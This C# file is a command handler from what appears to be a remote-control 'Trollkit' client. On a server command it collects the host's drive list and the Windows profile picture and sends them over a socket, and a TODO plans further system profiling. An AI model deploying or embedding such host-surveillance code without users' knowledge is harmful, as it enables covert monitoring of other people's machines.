using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
    class SystemInfoHandler : ICommandHandler
    {
        public override bool HandleCommand(Socket s, TransferCommandObject obj)
        {
			switch (obj.Command)
			{
				case "GetClientInfo":
					CollectAndReturnSystemInfo(s);
					return true;
			}

			return false;
        }

		private void CollectAndReturnSystemInfo(Socket s)
		{
			string drives = GetSystemDrives();
			TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));

			//TODO: cpu, ram??, windows version, network, peripherals
			string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
			TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
		}


        private string GetSystemDrives()
        {
            string returnString = "Available Drives: ";
            var drives = DriveInfo.GetDrives();
            foreach (DriveInfo info in drives)
            {
                if (info.IsReady)
                {
                    returnString += $"({info.Name.Replace("\\", "")}) ";
                }
            }
            return returnString;
        }
    }
}
